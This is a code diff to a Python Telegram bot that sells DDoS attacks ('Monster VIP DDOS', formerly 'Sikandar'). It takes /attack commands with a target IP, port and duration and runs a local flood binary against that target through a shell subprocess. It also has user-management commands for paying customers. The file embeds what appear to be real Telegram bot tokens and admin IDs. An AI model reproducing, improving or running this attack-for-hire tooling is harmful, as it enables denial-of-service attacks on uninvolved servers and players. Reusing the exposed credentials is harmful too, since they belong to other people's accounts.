@@ -2,8 +2,8 @@ import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7300928635:AAG-pNqG_2Mplw91A6xDfg_enMYRU6_jmTY'
-ADMIN_USER_ID =1216702307
+TELEGRAM_BOT_TOKEN = '7703353614:AAE3FD9dcMP3jnrx6AK-3xHwWJKBfAY54j8'
+ADMIN_USER_ID =7353797869
 USERS_FILE = 'users.txt'
 attack_in_progress = False
 
@@ -23,13 +23,13 @@ users = load_users()
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🔥 Welcome to the Sikandar VIP DDOS🔥*\n\n"
+        "*🔥 Welcome to the Monster VIP DDOS🔥*\n\n"
         "*Use /attack <ip> <port> <duration>*\n"
         "*Let Start Fucking ⚔️💥*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def Sikandar(update: Update, context: CallbackContext):
+async def Monster(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     args = context.args
 
@@ -38,7 +38,7 @@ async def Sikandar(update: Update, context: CallbackContext):
         return
 
     if len(args) != 2:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /Sikandar <add|rem> <user_id>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /Monster <add|rem> <user_id>*", parse_mode='Markdown')
         return
 
     command, target_user_id = args
@@ -63,7 +63,7 @@ async def run_attack(chat_id, ip, port, duration, context):
 
     try:
         # Command with fixed parameters
-        command = f"./bgmi {ip} {port} {duration} {packet_size} {threads}"
+        command = f"./daku {ip} {port} {duration} {packet_size} {threads}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -84,7 +84,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     finally:
         # Mark attack as complete
         attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our Sikandar DDOS Bot!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our  DDOS Bot!*", parse_mode='Markdown')
 
 async def attack(update: Update, context: CallbackContext):
     global attack_in_progress
@@ -119,7 +119,7 @@ async def attack(update: Update, context: CallbackContext):
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("Sikandar", Sikandar))
+    application.add_handler(CommandHandler("Monster", Monster))
     application.add_handler(CommandHandler("attack", attack))
     application.run_polling()
 
